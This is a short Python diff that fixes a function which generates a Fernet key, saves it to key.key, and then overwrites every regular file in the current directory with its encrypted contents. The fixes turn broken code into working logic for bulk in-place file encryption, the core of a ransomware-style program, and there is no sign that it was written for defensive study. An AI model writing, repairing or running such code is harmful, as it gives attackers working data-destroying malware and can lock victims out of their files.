@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 def encrypt():
     key = Fernet.generate_key()
-    f = Fernet(key)
+    cipher =Fernet(key)
 
     with open("key.key", "wb") as f:
         f.write(key)
@@ -14,15 +14,15 @@ def encrypt():
 
     items = os.listdir(cwd)
     for file in items:
-        if os.path.isdir(file):
-            file.append(files)
+        if os.path.isfile(file) and file != "key.key":
+            files.append(file)
 
     for item in files:
-        with open(item, "wb") as i:
-            i.read() = oldContent
-            f.encrypt(oldContent) = newContent
-            i.write(newContent)
-        
+        with open(item, "rb") as i:
+            oldContent = i.read()
+        with open(item, "wb") as e:
+            newContent = cipher.encrypt(oldContent)
+            e.write(newContent)
 
 if __name__ == "__main__":
     encrypt()
